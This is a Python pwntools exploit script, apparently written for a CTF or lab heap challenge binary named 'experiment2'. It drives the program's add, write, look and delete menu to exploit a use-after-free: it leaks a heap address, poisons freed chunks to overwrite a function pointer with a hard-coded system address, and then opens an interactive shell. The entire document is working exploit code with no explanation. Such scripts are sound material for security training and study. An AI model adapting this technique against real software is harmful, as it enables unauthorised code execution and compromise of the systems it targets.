from pwn import *
p = process('./experiment2')
system_addr = 0x4009c7
#context.log_level = 'debug'
def add(length):
	p.sendline('1')
	p.recvuntil("length\n")
	p.sendline(str(length))
	p.recvuntil('deletenode\n')
def write(index,content):
	p.sendline('2')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil("content\n")
	p.sendline(content)
	p.recvuntil('deletenode\n')
def look(index):
	p.sendline('3')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	re = p.recvuntil('deletenode\n')
	return re
def delete(index):
	p.sendline('4')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil('deletenode\n')
#gdb.attach(p,'b*0x4008DD')

add(0x38)
add(0x38)
add(0x38)
delete(2)
delete(1)
delete(0)

#delete(2)
#context.log_level = 'debug'
heap = u64(look(0)[:8].ljust(8,'\x00'))#uaf leak heap addr
print(hex(heap))
add(0x20)#0
add(0x20)#1
add(0x20)#2

write(2,p64(heap+0x20))
add(0x20)#3
add(0x20)#4
write(4,p64(system_addr)*2)
p.sendline('3')
p.recvuntil("node\n")
p.sendline(str(1))
p.interactive()


